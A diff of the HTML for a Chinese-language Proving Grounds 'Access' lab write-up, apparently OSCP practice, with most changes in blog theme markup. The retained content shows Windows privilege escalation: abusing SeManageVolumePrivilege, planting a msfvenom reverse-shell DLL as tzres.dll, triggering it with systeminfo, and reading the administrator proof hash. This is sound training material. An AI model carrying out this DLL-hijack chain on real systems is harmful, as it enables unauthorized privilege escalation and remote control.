+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>再次进行信息搜集</p>
 <p>发现当前用户权限如下：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -932,8 +880,7 @@
 </span></span><span class="line"><span class="cl">SeMachineAccountPrivilege     Add workstations to domain       Disabled
 </span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 
 </span></span><span class="line"><span class="cl">SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
-</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set</span>   Disabled
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set</span>   Disabled</span></span></code></pre></td></tr></table>
 </div>
 </div><p>其中<code>SeManageVolumePrivilege</code>权限可被用于提权，相关链接：https://github.com/xct/SeManageVolumeAbuse</p>
 <p>需要用vs stuido手动编译一下</p>
@@ -988,8 +935,7 @@
 </span></span><span class="line"><span class="cl">           APPLICATION PACKAGE AUTHORITY<span class="se">\A</span>LL RESTRICTED APPLICATION PACKAGES:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>GR,GE<span class="o">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Successfully processed <span class="m">1</span> files<span class="p">;</span> Failed processing <span class="m">0</span> files
-</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; 
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; </span></span></code></pre></td></tr></table>
 </div>
 </div><p>接下去要上传 tzres.dll到 C:\Windows\System32\wbem\tzres.dll，再通过systeminfo命令去触发它</p>
 <p>使用msfvenom生成一个64位反弹shell的dll文件</p>
@@ -1012,8 +958,7 @@
 </span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
 </span></span><span class="line"><span class="cl">Payload size: <span class="m">460</span> bytes
 </span></span><span class="line"><span class="cl">Final size of dll file: <span class="m">9216</span> bytes
-</span></span><span class="line"><span class="cl">Saved as: tzres.dll
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">Saved as: tzres.dll</span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1046,8 +991,7 @@
 </span></span><span class="line"><span class="cl">    + CategoryInfo          : NotSpecified: <span class="o">(</span>ERROR: The remote procedure call failed.:String<span class="o">)</span> <span class="o">[]</span>, RemoteException
 </span></span><span class="line"><span class="cl">    + FullyQualifiedErrorId : NativeCommandError
 </span></span><span class="line"><span class="cl"> 
-</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; 
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; </span></span></code></pre></td></tr></table>
 </div>
 </div><p>收到反弹shell：</p>
 <div class="highlight"><div class="chroma">
@@ -1087,35 +1031,29 @@
 </span></span></span><span class="line"><span class="cl"><span class="se"></span>
 </span></span><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;type proof.txt
 </span></span><span class="line"><span class="cl"><span class="nb">type</span> proof.txt
-</span></span><span class="line"><span class="cl">d0be636ebf08cd4c91a276012f25a135
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">d0be636ebf08cd4c91a276012f25a135</span></span></code></pre></td></tr></table>
 </div>
-</div><p><img loading="lazy" src="resource/14-W-M-Access.assets/image-20240112024650736.png" srcset="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112024650736.png, resource/14-W-M-Access.assets/image-20240112024650736.png 1.5x, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112024650736.png 2x" sizes="auto" data-title="image-20240112024650736" data-alt="image-20240112024650736" width="3346" height="1254" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+</div><p><img loading="lazy" src="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112024650736.png" alt="image-20240112024650736" srcset="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112024650736.png?size=small, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112024650736.png?size=medium 1.5x, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112024650736.png?size=large 2x" data-title="image-20240112024650736" style="--width: 3346px;--aspect-ratio: 3346 / 1254;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 </div><div class="post-footer" id="post-footer">
   <div class="post-info">
     <div class="post-info-line">
       <div class="post-info-mod">
-        <span title=2024-01-12&#32;06:17:36>更新于 2024-01-12&nbsp;</span>
+        <span title="更新于 2024-01-12 06:17:36">更新于 2024-01-12&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
       </div></div>
-    <div class="post-info-line">
-      <div class="post-info-md"></div>
-      <div class="post-info-share">
-        <span></span>
-      </div>
-    </div>
-  </div>
 
   <div class="post-info-more">
-    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/oscp/' class="post-tag">OSCP</a><a href='/tags/pg_practice/' class="post-tag">PG_Practice</a></section>
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/oscp/" class="post-tag" title="标签 - OSCP">OSCP</a><a href="/tags/pg_practice/" class="post-tag" title="标签 - PG_Practice">PG_Practice</a></section>
     <section>
       <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
     </section>
-  </div>
-
-  <div class="post-nav"><a href="/posts/provinggrouds_surf_writeup/" class="post-nav-item" rel="prev" title="ProvingGrouds Surf WriteUp"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>ProvingGrouds Surf WriteUp</a>
-      <a href="/posts/provinggrounds-heist/" class="post-nav-item" rel="next" title="ProvingGrounds Heist Writeup">ProvingGrounds Heist Writeup<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+  </div><div class="post-nav"><a href="/posts/provinggrouds_surf_writeup/" class="post-nav-item" rel="prev" title="ProvingGrouds Surf WriteUp"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>ProvingGrouds Surf WriteUp</a><a href="/posts/provinggrounds-heist/" class="post-nav-item" rel="next" title="ProvingGrounds Heist Writeup">ProvingGrounds Heist Writeup<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
 </div>
-<div id="comments"><div id="giscus">
+<div id="comments"><div id="giscus" class="comment">
           <script
             src="https://giscus.app/client.js"
             data-repo="XavierRoot/XavierBlog"
@@ -1123,6 +1061,7 @@
             data-category="Announcements"
             data-category-id="DIC_kwDOHswyxs4Cd2zm"
             data-mapping="title"
+            data-strict="0"
             
             data-theme="preferred_color_scheme"
             data-reactions-enabled="1"
@@ -1137,13 +1076,16 @@
         </div>
         <noscript>
           Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
-        </noscript></div></article></main><footer class="footer">
-    <div class="footer-container"><div class="footer-line statistics"></div><div class="footer-line visitor">
-          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </noscript></div></article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
         </div></div>
   </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
         </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
-    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
   </noscript>
-</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/lunr/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":true,"expired":false,"giscus":{"darkTheme":"dark","lightTheme":"light"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":30,"type":"lunr"},"twemoji":true};</script><script src="/js/theme.min.js" defer></script></body>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="https://vercount.one/js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":true,"expired":false,"giscus":{"darkTheme":"dark","lightTheme":"light","origin":"https://giscus.app"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":30},"twemoji":true,"version":"v0.3.16"};</script><script src="/js/theme.min.js" defer></script></body>
 </html>
